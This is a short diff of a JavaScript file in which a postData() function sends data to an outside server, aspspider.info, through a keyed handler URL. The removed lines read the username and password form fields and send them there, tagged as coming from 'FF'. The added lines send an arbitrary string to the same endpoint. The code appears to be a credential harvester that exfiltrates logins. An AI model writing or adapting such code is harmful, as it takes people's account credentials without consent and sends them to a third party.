@@ -14,8 +14,8 @@ function callbackparam(data){
 	console.log(data);
 }
 
-function postData(){
-	var content = "【来自FF】"+document.getElementById('tbUserName').value+"|"+document.getElementById('tbPassword').value;
+function postData(str){
+	var content = "【来自FF】" + str;
 	var url = "http://aspspider.info/CatcherXue0/Handler/ajaxhandler.ashx?key=CatcherX&content=" + content;
 	ajax("GET", url, callbackparam);
 }
